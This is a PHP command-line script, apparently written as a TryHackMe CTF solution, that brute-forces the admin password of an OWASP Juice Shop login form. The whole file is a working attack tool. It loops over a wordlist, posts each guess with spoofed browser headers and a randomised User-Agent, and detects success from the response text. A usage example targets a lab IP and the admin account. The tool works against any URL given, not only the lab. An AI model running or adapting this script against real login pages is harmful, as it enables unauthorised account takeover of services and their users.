<?php

$local_args = [
    "--wordlist" => false,
    "--username_field" => "email",
    "--url" => false,
    "--json" => false,
    "--username" => false,
    "--v" => false,
    "--lookfor" => "",
    "--not_lookfor" => "",
];

$local_args_help = [    
    "Disclaimer: " => "Use this script wisely and be a gentleman/woman.",
    
    "Written by: " => "Babak Bandpey babak.bandpey@gmail.com as a solution finder for a TryHackMe CTF in OWASP Juice Shop bruteforce the admin password.",
    
    "--wordlist" => "The wordlist containing the words you like to try as password. Usually located in /usr/share/wordlists/",
    
    "--username_field" => "The name of the username field. Could be email or username or whatever the form contains",
    
    "--url" => "The URL which the form is post to.",
    
    "--json" => "Set to true if you like to send the request in JSON format.",
    
    "--username" => "The value of the username_field. if email then an email-address or just a username.",
    
    "--v" => "Try verbose mode.",
    
    "--lookfor" => "What 'to look for' to assert that the password logged in.",
    
    "--not_lookfor" => "What 'not to look for' to assert that the password logged in.",    
    
];


if(count($argv) > 1) {
    for($i = 1; $i < count($argv); $i++){
        $tmp = explode("=", $argv[$i]);

        if($tmp[0] == "--help") {
            show_help($local_args_help);
            exit;
        }

        if(array_key_exists($tmp[0], $local_args)) {
            $local_args[$tmp[0]] = $tmp[1];
        }        
    }    
}

if(
    !$local_args["--wordlist"] ||
    !$local_args["--url"] ||
    !$local_args["--username"]
    ){
        show_help($local_args_help);
        exit;
    }



$wordlist = $local_args["--wordlist"];

$c = 0;

try{
    if (file_exists($wordlist) && $file = fopen($wordlist, "r")) {
        while(!feof($file)) {
            $psswd = trim(fgets($file));

            if($local_args['--v']) {
                echo ++$c . " - Trying: " . $psswd . "\n";
            }

            if( $result = post_request($local_args["--url"], [$local_args['--username_field']=>$local_args["--username"],"password"=>$psswd], $local_args["--json"] )) {

                if($local_args['--v']) {
                    echo $result . "\n";
                }


                if( 
                    ($local_args["--lookfor"] && strpos($result, $local_args["--lookfor"])) || 
                    ($local_args["--not_lookfor"] && !strpos($result, $local_args["--not_lookfor"]))
                ) {                    
                    $str = "**** Password: {$psswd} ****";
                    echo str_repeat("*", strlen($str)) . PHP_EOL;
                    echo $str . PHP_EOL;
                    echo str_repeat("*", strlen($str)) . PHP_EOL;                    
                    break;
                }

            }          
        }
        fclose($file);
    } else {
        throw new Exception("Wordlist file not found or read protected.....\n" . $wordlist . "\n\n" , 1);        
    }
} catch(Exception $e) {
    echo "Message: " . $e->getMessage();
    echo "";
    echo "getCode(): " . $e->getCode();
    echo "";
    echo "__toString(): " . $e->__toString();
}

/**
 * post_request
 *
 * @param  mixed $url
 * @param  mixed $params
 * @param  mixed $json_encode
 * @return void
 */
function post_request($url, array $params, $json_encode = false) {
    
    $parsed_url = parse_url($url);

    if(!$json_encode) {
        // use this for 'Content-type: application/x-www-form-urlencoded',
        $content = http_build_query($params);
    } else {
        //use this for 'Content-Type: application/json'
        $content = json_encode($params);
    }

    $req = [
        'http' => [
            'header'  => [ // header array does not need '\r\n'
                $json_encode ? 'Content-Type: application/json' : 'Content-type: application/x-www-form-urlencoded',
                'Host: ' . $parsed_url['host'],
                'Accept-Language: en-US,en;q=0.5',
                'Accept-Encoding: gzip, deflate',
                'Accept: application/json, text/plain, */*',
                'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:' . rand(10, 100) . '.0) Gecko/20100101 Firefox/' . rand(10, 100). '.0',
                'Content-Length: ' . strlen($content),
                'Origin: ' . $parsed_url['host'],
                'Cookie: io=5NClLy2aB1zEuoKgAAAd; language=en; continueCode=Pwma6XxDOa3kY5bEJRzoqLnyBWpd9qiQdKeMNmr8P1lv4w9VjZ2g7Q6g4Rzx',
                'Referer: ' . $parsed_url['scheme'] . '://' . $parsed_url['host'] . '/',
                'DNT: 1'
            ],
            'method'  => 'POST',
            'content' => $content
        ]
    ];

    @$fp = fopen(
        $url, 
        'r', 
        FALSE, // do not use_include_path
        stream_context_create($req)
    );

    if ($fp) {        
        $result = stream_get_contents($fp); // no maxlength/offset
        fclose($fp);
        return $result;
    }    

    return false;
}


function show_help($local_args) {
    foreach($local_args as $key => $help) {
        echo " ----- " . PHP_EOL;
        echo " * " . $key . " => ". $help . PHP_EOL;
    }
    echo " ----- " . PHP_EOL;
    echo "You need to provide the --wordlist, --url and --email as minumum." . PHP_EOL . PHP_EOL;
    echo "Example: passwd_brute.php --wordlist=/usr/share/seclists/Passwords/Common-Credentials/best1050.txt --json=true --url=http://10.10.32.195/rest/user/login --username=admin@juice-sh.op --v=true --not_lookfor=\"Please provide a valid username and password\"" . PHP_EOL . PHP_EOL;
}